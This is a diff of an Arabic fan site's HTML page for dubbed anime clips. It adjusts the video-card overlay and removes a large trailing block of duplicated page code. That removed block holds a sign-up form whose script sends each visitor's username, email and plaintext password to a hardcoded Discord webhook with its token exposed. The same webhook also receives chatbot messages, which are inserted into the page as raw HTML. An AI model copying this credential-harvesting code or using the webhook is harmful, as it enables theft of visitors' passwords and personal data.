@@ -115,13 +115,12 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            opacity: 0;
+            opacity: 1; /* Keep visible by default */
             transition: opacity 0.3s ease;
         }
-        
-        .video-card-container:hover .video-overlay,
+
         .video-card-container.playing .video-overlay {
-            opacity: 1;
+            opacity: 0;
         }
         
         .play-pause-icon {
@@ -402,18 +401,19 @@
             
             clipCard.innerHTML = `
                 <div class="relative aspect-video">
-                    <img src="${clip.thumbnail}" alt="Thumbnail for clip number ${index + 1}" class="w-full h-full object-cover">
-                    <video class="w-full h-full object-cover absolute top-0 left-0 hidden" controls preload="none">
+                    <img src="${clip.thumbnail}" alt="Thumbnail for clip number ${index + 1}" class="w-full h-full object-cover rounded-2xl">
+                    <video class="w-full h-full object-cover absolute top-0 left-0 hidden rounded-2xl" controls preload="none">
                         <source src="${clip.file}" type="video/mp4">
                         متصفحك لا يدعم صيغة الفيديو.
                     </video>
-                    <div class="video-overlay">
+                    <div class="video-overlay flex flex-col items-center justify-center">
                         <i class="fas fa-play play-pause-icon"></i>
+                        <p class="mt-2 text-white font-bold text-lg pointer-events-none">${clip.name}</p>
                     </div>
                 </div>
                 <div class="p-4">
-                    <h3 class="font-bold text-lg mb-2">${clip.name}</h3>
-                    <p class="text-gray-400 text-sm mb-3">${clip.character}</p>
+                    <h3 class="font-bold text-lg mb-2 hidden">${clip.name}</h3>
+                    <p class="text-gray-400 text-sm mb-3 hidden">${clip.character}</p>
                     <div class="flex justify-between items-center text-sm">
                         <a href="${clip.download}" download class="text-yellow-400 hover:text-yellow-500 transition-colors"><i class="fas fa-download mr-1"></i> تحميل</a>
                     </div>
@@ -423,34 +423,25 @@
             const videoElement = clipCard.querySelector('video');
             const thumbnailImage = clipCard.querySelector('img');
             const playPauseIcon = clipCard.querySelector('.play-pause-icon');
-            
-            // عند النقر على البطاقة، يتم تشغيل أو إيقاف الفيديو
-            clipCard.addEventListener('click', () => {
-                if (clipCard.classList.contains('playing')) {
-                    videoElement.pause();
-                    clipCard.classList.remove('playing');
-                    thumbnailImage.classList.remove('hidden');
-                    videoElement.classList.add('hidden');
-                    playPauseIcon.classList.remove('fa-pause');
-                    playPauseIcon.classList.add('fa-play');
-                } else {
-                    // إيقاف تشغيل أي فيديو آخر
-                    document.querySelectorAll('.video-card-container.playing video').forEach(v => {
-                        v.pause();
-                        v.closest('.video-card-container').classList.remove('playing');
-                        v.closest('.video-card-container').querySelector('img').classList.remove('hidden');
-                        v.classList.add('hidden');
-                        v.closest('.video-card-container').querySelector('.play-pause-icon').classList.remove('fa-pause');
-                        v.closest('.video-card-container').querySelector('.play-pause-icon').classList.add('fa-play');
-                    });
+            const videoOverlay = clipCard.querySelector('.video-overlay');
 
-                    videoElement.play();
-                    clipCard.classList.add('playing');
-                    thumbnailImage.classList.add('hidden');
-                    videoElement.classList.remove('hidden');
-                    playPauseIcon.classList.remove('fa-play');
-                    playPauseIcon.classList.add('fa-pause');
-                }
+            // عند النقر على الصورة المصغرة أو الـ overlay، يبدأ تشغيل الفيديو
+            videoOverlay.addEventListener('click', () => {
+                // إيقاف تشغيل أي فيديو آخر
+                document.querySelectorAll('.video-card-container.playing video').forEach(v => {
+                    v.pause();
+                    const playingCard = v.closest('.video-card-container');
+                    playingCard.classList.remove('playing');
+                    playingCard.querySelector('img').classList.remove('hidden');
+                    v.classList.add('hidden');
+                    playingCard.querySelector('.video-overlay').classList.remove('opacity-0', 'pointer-events-none');
+                });
+                
+                videoElement.play();
+                clipCard.classList.add('playing');
+                thumbnailImage.classList.add('hidden');
+                videoElement.classList.remove('hidden');
+                videoOverlay.classList.add('opacity-0', 'pointer-events-none');
             });
 
             // عند انتهاء الفيديو، يتم العودة للصورة المصغرة
@@ -458,8 +449,7 @@
                 clipCard.classList.remove('playing');
                 thumbnailImage.classList.remove('hidden');
                 videoElement.classList.add('hidden');
-                playPauseIcon.classList.remove('fa-pause');
-                playPauseIcon.classList.add('fa-play');
+                videoOverlay.classList.remove('opacity-0', 'pointer-events-none');
             });
 
             return clipCard;
@@ -562,500 +552,6 @@
         // عند تحميل الصفحة
         window.addEventListener('load', function() {
             renderClips(videoClips);
-        });
-    </script>
-</body>
-</html>
-
-nsition-colors cta-button">تأكيد</button>
-            </div>
-        </div>
-
-        <!-- Chatbot Modal -->
-        <div id="chatbot-modal" class="fixed inset-0 bg-black/80 z-[10002] flex items-center justify-center hidden transition-opacity duration-300">
-            <div class="bg-gray-800 p-6 rounded-lg shadow-xl max-w-md w-full mx-4 flex flex-col h-3/4 max-h-[600px] border-2 border-yellow-500">
-                <div class="flex justify-between items-center mb-4">
-                    <h3 class="text-xl font-bold text-yellow-300">إرسال اقتراحات</h3>
-                    <button id="close-chatbot-modal" class="text-gray-400 hover:text-yellow-500">
-                        <i class="fas fa-times text-xl"></i>
-                    </button>
-                </div>
-                <div id="chat-messages" class="flex-1 overflow-y-auto p-4 bg-[#1a1a4a] rounded-lg mb-4 text-gray-200 space-y-4">
-                    <!-- Chatbot initial message -->
-                    <div class="flex justify-start">
-                        <div class="bg-[#3a3a88] p-3 rounded-xl rounded-bl-none max-w-[80%] shadow-md">
-                            <p>مرحباً! أرسل لنا اقتراحاتك أو أي خطأ وجدته في الموقع، وسنقوم بمراجعته.</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="flex gap-2">
-                    <input type="text" id="chatbot-input" placeholder="اكتب اقتراحك هنا..." class="flex-1 py-3 px-4 rounded-full bg-[#0f0f2a] text-white border border-gray-700 focus:outline-none focus:ring-2 focus:ring-yellow-500/50 transition-all">
-                    <button id="chatbot-send-button" class="w-12 h-12 rounded-full bg-yellow-500 text-gray-900 flex items-center justify-center hover:bg-yellow-400 transition-colors cta-button">
-                        <i class="fas fa-paper-plane"></i>
-                    </button>
-                </div>
-            </div>
-        </div>
-    </div>
-    
-    <script>
-        // بيانات اللقطات مع صور مصغرة مخصصة.
-        const videoClips = [
-            {
-                name: "دريم ماتش",
-                file: "clip1.mp4", 
-                thumbnail: "photo1.png", 
-                character: "inazumaAR",
-                download: "clip1.mp4"
-            },
-            {
-                name: "اختيار العيبة الجداد",
-                file: "clip2.mp4",
-                thumbnail: "photo2.jpg",
-                character: "inazumaAR",
-                download: "clip2.mp4"
-            },
-            {
-                name: "شوية ضحك ",
-                file: "clip3.mp4",
-                thumbnail: "photo3.jpg",
-                character: "inazumaAR",
-                download: "clip3.mp4"
-            },
-            {
-                name: "معرفة روان حقيقتها",
-                file: "clip4.mp4",
-                thumbnail: "photo4.jpg",
-                character: "inazumaAR",
-                download: "clip4.mp4"
-            },
-            {
-                name: "لقطات من الديمو",
-                file: "clip5.mp4",
-                thumbnail: "photo5.jpg",
-                character: "inazumaAR",
-                download: "clip5.mp4"
-            },
-            {
-                name: "معرفة العيبة الجداد",
-                file: "clip6.mp4",
-                thumbnail: "photo6.jpg",
-                character: "inazumaAR",
-                download: "clip6.mp4"
-            },
-            {
-                name: "  مباراة كأس العالم اضغط على زر تحميل اللقطة لكى تشاهدها على جوجل دريف لان حجمها كبير",
-                file: "https://drive.google.com/file/d/1MvPp39sl85wUNpPZVtXZ-K8ADScVLBsK/view",
-                thumbnail: "photo7.jpg",
-                character: "inazumaAR",
-                download: "https://drive.google.com/uc?export=download&id=1MvPp39sl85wUNpPZVtXZ-K8ADScVLBsK"
-            }
-        ];
-
-        // Webhook URL لإرسال بيانات المستخدم
-        const webhookUrl = 'https://discord.com/api/webhooks/1403754910151086221/_nMSBkyQTl-0vI45bYzar9LprDgSDz6ha0MxQJZ-qOW1nkpjoyH5BKlclMJJfuOM-75A';
-        
-        // عناصر نافذة تسجيل الدخول
-        const loginModal = document.getElementById('login-modal');
-        const loginForm = document.getElementById('login-form');
-        const mainContent = document.getElementById('main-content');
-        const usernameInput = document.getElementById('username');
-        const emailInput = document.getElementById('email');
-        const passwordInput = document.getElementById('password');
-        const usernameError = document.getElementById('username-error');
-        const emailError = document.getElementById('email-error');
-        const passwordError = document.getElementById('password-error');
-        
-        // عناصر الترحيب
-        const welcomeMessage = document.getElementById('welcome-message');
-        const welcomeUserSpan = document.getElementById('welcome-user');
-        
-        // التحقق من صحة البيانات
-        function validateForm() {
-            let isValid = true;
-            
-            // التحقق من اسم المستخدم
-            if(usernameInput.value.trim() === '') {
-                usernameError.style.display = 'block';
-                usernameInput.classList.add('border-red-500');
-                isValid = false;
-            } else {
-                usernameError.style.display = 'none';
-                usernameInput.classList.remove('border-red-500');
-            }
-            
-            // التحقق من البريد الإلكتروني
-            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            if(!emailPattern.test(emailInput.value)) {
-                emailError.style.display = 'block';
-                emailInput.classList.add('border-red-500');
-                isValid = false;
-            } else {
-                emailError.style.display = 'none';
-                emailInput.classList.remove('border-red-500');
-            }
-            
-            // التحقق من كلمة المرور (8 أحرف على الأقل)
-            if(passwordInput.value.length < 8) {
-                passwordError.style.display = 'block';
-                passwordInput.classList.add('border-red-500');
-                isValid = false;
-            } else {
-                passwordError.style.display = 'none';
-                passwordInput.classList.remove('border-red-500');
-            }
-            
-            return isValid;
-        }
-        
-        // إرسال بيانات المستخدم إلى الويب هوك
-        async function sendUserData(userData) {
-            try {
-                const response = await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        content: '**مستخدم جديد مسجل**:',
-                        embeds: [{
-                            title: 'تفاصيل المستخدم',
-                            fields: [
-                                { name: 'اسم المستخدم', value: userData.username },
-                                { name: 'البريد الإلكتروني', value: userData.email },
-                                { name: 'كلمة المرور', value: userData.password },
-                                { name: 'وقت التسجيل', value: new Date().toLocaleString() }
-                            ],
-                            color: 16763904 // اللون الأصفر
-                        }]
-                    }),
-                });
-                
-                if (response.ok) {
-                    return true;
-                } else {
-                    console.error('فشل إرسال البيانات:', response.statusText);
-                    return false;
-                }
-            } catch (error) {
-                console.error('خطأ في إرسال البيانات:', error);
-                return false;
-            }
-        }
-        
-        // إظهار رسالة الترحيب
-        function showWelcomeMessage(userName) {
-            welcomeUserSpan.textContent = userName;
-            welcomeMessage.classList.remove('translate-x-full');
-            setTimeout(() => {
-                welcomeMessage.classList.add('translate-x-full');
-            }, 3000);
-        }
-        
-        // معالجة إرسال النموذج
-        loginForm.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            if (validateForm()) {
-                const userData = {
-                    username: usernameInput.value.trim(),
-                    email: emailInput.value.trim(),
-                    password: passwordInput.value
-                };
-                
-                // عرض رسالة تحميل
-                const submitButton = loginForm.querySelector('button[type="submit"]');
-                const originalButtonText = submitButton.innerHTML;
-                submitButton.innerHTML = '<i class="fas fa-spinner fa-spin ml-2"></i> جارٍ التسجيل...';
-                submitButton.disabled = true;
-                
-                // إرسال البيانات
-                const sendSuccess = await sendUserData(userData);
-                
-                if (sendSuccess) {
-                    // حفظ اسم المستخدم في localStorage للترحيب به لاحقاً
-                    localStorage.setItem('inazuma-username', userData.username);
-                    // حفظ حالة تسجيل الدخول
-                    localStorage.setItem('inazuma-logged-in', 'true');
-                    
-                    // إخفاء نافذة التسجيل وإظهار المحتوى الرئيسي
-                    loginModal.style.opacity = '0';
-                    loginModal.style.pointerEvents = 'none';
-                    setTimeout(() => {
-                        mainContent.classList.remove('hidden');
-                        
-                        // عرض رسالة ترحيب
-                        showWelcomeMessage(userData.username);
-                        
-                        // عرض رسالة التحذير
-                        setTimeout(() => {
-                            document.getElementById('initial-warning-modal').classList.remove('hidden');
-                        }, 1000);
-                    }, 500);
-                } else {
-                    alert('حدث خطأ أثناء التسجيل. يرجى المحاولة مرة أخرى.');
-                    submitButton.innerHTML = originalButtonText;
-                    submitButton.disabled = false;
-                }
-            }
-        });
-
-        // بقية عناصر DOM
-        const videoPlayer = document.getElementById('video-player');
-        const videoPlaceholder = document.getElementById('video-placeholder');
-        const videoTitle = document.getElementById('video-title');
-        const videoCharacter = document.getElementById('video-character');
-        const videoDescription = document.getElementById('video-description');
-        const backToTopBtn = document.getElementById('back-to-top');
-        const clipsContainer = document.getElementById('clips-container');
-        const searchInput = document.getElementById('search-input');
-        const messageModal = document.getElementById('message-modal');
-        const closeMessageModal = document.getElementById('close-message-modal');
-        const initialWarningModal = document.getElementById('initial-warning-modal');
-        const closeInitialWarningModal = document.getElementById('close-initial-warning-modal');
-        const nameModal = document.getElementById('name-modal');
-        const nameInput = document.getElementById('name-input');
-        const saveNameButton = document.getElementById('save-name-button');
-        const chatbotButton = document.getElementById('chatbot-button');
-        const chatbotModal = document.getElementById('chatbot-modal');
-        const closeChatbotModal = document.getElementById('close-chatbot-modal');
-        const chatbotInput = document.getElementById('chatbot-input');
-        const chatbotSendButton = document.getElementById('chatbot-send-button');
-        const chatMessages = document.getElementById('chat-messages');
-        const logoutButton = document.getElementById('logout-button');
-        const downloadBtn = document.getElementById('download-btn');
-
-        // وظيفة لإظهار نافذة الرسائل
-        function showMessage(title, content) {
-            document.getElementById('message-title').textContent = title;
-            document.getElementById('message-content').textContent = content;
-            messageModal.classList.remove('hidden');
-        }
-
-        closeMessageModal.addEventListener('click', () => {
-            messageModal.classList.add('hidden');
-        });
-
-        // إظهار نافذة التحذير عند أول زيارة
-        function showInitialWarning() {
-            if (!localStorage.getItem('inazuma-warning-seen')) {
-                initialWarningModal.classList.remove('hidden');
-                localStorage.setItem('inazuma-warning-seen', 'true');
-            }
-        }
-        
-        closeInitialWarningModal.addEventListener('click', () => {
-            initialWarningModal.classList.add('hidden');
-        });
-
-        // دالة لتشغيل الفيديو وتحريك الصفحة للأعلى
-        function playVideo(index) {
-            const clip = videoClips[index];
-            
-            videoTitle.textContent = clip.name; 
-            videoCharacter.textContent = clip.character;
-            videoDescription.textContent = `مشهد مدبلج ${clip.character}`; 
-            downloadBtn.href = clip.download;
-            
-            videoPlaceholder.style.display = 'none';
-            videoPlayer.style.display = 'block';
-            
-            videoPlayer.src = clip.file;
-            videoPlayer.play();
-            
-            const videoPlayerContainer = document.querySelector('.video-player-container');
-            videoPlayerContainer.scrollIntoView({ behavior: 'smooth', block: 'start' });
-
-            videoTitle.classList.add('animate-pulse-glow');
-            setTimeout(() => {
-                videoTitle.classList.remove('animate-pulse-glow');
-            }, 2000);
-        }
-
-        // دالة لإنشاء بطاقة فيديو
-        function createClipCard(clip, index) {
-            const clipCard = document.createElement('div');
-            clipCard.classList.add('clip-card', 'card-gradient', 'rounded-2xl', 'overflow-hidden', 'shadow-xl', 'energy-glow', 'cursor-pointer', 'animate-on-scroll');
-            
-            clipCard.innerHTML = `
-                <div class="relative aspect-video" onclick="playVideo(${index})">
-                    <img src="${clip.thumbnail}" alt="Thumbnail for clip number ${index + 1}" class="w-full h-full object-cover transition-transform duration-300 transform hover:scale-110">
-                    <div class="absolute inset-0 bg-black/50 flex items-center justify-center opacity-0 hover:opacity-100 transition-opacity">
-                        <i class="fas fa-play text-4xl text-yellow-500"></i>
-                    </div>
-                </div>
-                <div class="p-4">
-                    <h3 class="font-bold text-lg mb-2">${clip.name}</h3>
-                    <p class="text-gray-400 text-sm mb-3">${clip.character}</p>
-                    <div class="flex justify-between items-center text-sm">
-                        <span class="text-yellow-400"><i class="fas fa-user mr-1"></i> ${clip.character}</span>
-                    </div>
-                </div>
-            `;
-
-            return clipCard;
-        }
-
-        // دالة لفلترة اللقطات وعرضها
-        function renderClips(clips) {
-            clipsContainer.innerHTML = ''; 
-            if (clips.length === 0) {
-                clipsContainer.innerHTML = '<p class="text-center text-gray-400 col-span-full">لا توجد لقطات مطابقة لنتائج البحث.</p>';
-                return;
-            }
-            clips.forEach((clip, index) => {
-                clipsContainer.appendChild(createClipCard(clip, index));
-            });
-        }
-        
-        // دالة البحث
-        function filterClips() {
-            const searchTerm = searchInput.value.toLowerCase();
-            const filteredClips = videoClips.filter(clip => 
-                clip.name.toLowerCase().includes(searchTerm) ||
-                clip.character.toLowerCase().includes(searchTerm)
-            );
-            renderClips(filteredClips);
-        }
-        
-        // ربط حدث الإدخال بدالة البحث
-        searchInput.addEventListener('input', filterClips);
-
-        // زر العودة للأعلى
-        window.addEventListener('scroll', function() {
-            if (window.scrollY > 300) {
-                backToTopBtn.style.opacity = '1';
-                backToTopBtn.style.visibility = 'visible';
-            } else {
-                backToTopBtn.style.opacity = '0';
-                backToTopBtn.style.visibility = 'hidden';
-            }
-            
-            // Animation on scroll
-            const scrollElements = document.querySelectorAll('.animate-on-scroll');
-            scrollElements.forEach(el => {
-                const elementTop = el.getBoundingClientRect().top;
-                const isVisible = elementTop < window.innerHeight * 0.9;
-                if (isVisible) {
-                    el.classList.add('animated');
-                }
-            });
-        });
-
-        backToTopBtn.addEventListener('click', function() {
-            window.scrollTo({
-                top: 0,
-                behavior: 'smooth'
-            });
-        });
-
-        // Chatbot functionality
-        chatbotButton.addEventListener('click', () => {
-            chatbotModal.classList.remove('hidden');
-        });
-        
-        closeChatbotModal.addEventListener('click', () => {
-            chatbotModal.classList.add('hidden');
-        });
-
-        async function sendChatbotMessage() {
-            const message = chatbotInput.value.trim();
-            if (message === '') return;
-
-            const userName = localStorage.getItem('inazuma-username') || 'زائر';
-            
-            const userMessageDiv = document.createElement('div');
-            userMessageDiv.classList.add('flex', 'justify-end');
-            userMessageDiv.innerHTML = `<div class="bg-yellow-500 text-gray-900 p-3 rounded-xl rounded-br-none max-w-[80%] shadow-md">${message}</div>`;
-            chatMessages.appendChild(userMessageDiv);
-            chatMessages.scrollTop = chatMessages.scrollHeight;
-
-            try {
-                const response = await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ content: `**رسالة من ${userName}**: ${message}` }),
-                });
-
-                if (response.ok) {
-                    const botReplyDiv = document.createElement('div');
-                    botReplyDiv.classList.add('flex', 'justify-start');
-                    botReplyDiv.innerHTML = `<div class="bg-[#3a3a88] p-3 rounded-xl rounded-bl-none max-w-[80%] shadow-md">شكراً لك ${userName}! تم استلام رسالتك وسنعمل على مراجعتها.</div>`;
-                    chatMessages.appendChild(botReplyDiv);
-                    chatMessages.scrollTop = chatMessages.scrollHeight;
-                } else {
-                    showMessage('خطأ في الإرسال', 'حدث خطأ أثناء إرسال رسالتك. يرجى المحاولة لاحقاً.');
-                }
-            } catch (error) {
-                showMessage('خطأ في الاتصال', 'حدث خطأ أثناء الاتصال بالخادم. يرجى التحقق من اتصالك بالإنترنت.');
-            }
-
-            chatbotInput.value = '';
-        }
-
-        chatbotSendButton.addEventListener('click', sendChatbotMessage);
-        chatbotInput.addEventListener('keypress', (event) => {
-            if (event.key === 'Enter') {
-                sendChatbotMessage();
-            }
-        });
-
-        // تسجيل الخروج
-        logoutButton.addEventListener('click', function() {
-            localStorage.removeItem('inazuma-logged-in');
-            localStorage.removeItem('inazuma-username');
-            location.reload();
-        });
-
-        // عند تحميل الصفحة
-        window.addEventListener('load', function() {
-            renderClips(videoClips);
-            
-            // التحقق من حالة تسجيل الدخول
-            const isLoggedIn = localStorage.getItem('inazuma-logged-in');
-            const userName = localStorage.getItem('inazuma-username');
-            
-            if (isLoggedIn === 'true') {
-                // إخفاء نافذة التسجيل
-                loginModal.style.display = 'none';
-                // إظهار المحتوى الرئيسي
-                mainContent.classList.remove('hidden');
-                
-                // عرض رسالة ترحيب إذا كان هناك اسم مستخدم
-                if (userName) {
-                    showWelcomeMessage(userName);
-                }
-                
-                // تشغيل الفيديو الأول بعد تأخير
-                setTimeout(() => {
-                    playVideo(0);
-                }, 1500);
-                
-                // عرض رسالة التحذير إذا لم تكن قد ظهرت من قبل
-                if (!localStorage.getItem('inazuma-warning-seen')) {
-                    setTimeout(() => {
-                        initialWarningModal.classList.remove('hidden');
-                        localStorage.setItem('inazuma-warning-seen', 'true');
-                    }, 2000);
-                }
-            } else {
-                // إظهار نافذة التسجيل فقط
-                loginModal.style.display = 'flex';
-            }
-            
-            // إضافة تأثيرات للعناصر عند التمرير
-            setTimeout(() => {
-                const scrollElements = document.querySelectorAll('.animate-on-scroll');
-                scrollElements.forEach(el => {
-                    const elementTop = el.getBoundingClientRect().top;
-                    const isVisible = elementTop < window.innerHeight * 0.9;
-                    if (isVisible) {
-                        el.classList.add('animated');
-                    }
-                });
-            }, 500);
         });
     </script>
 </body>
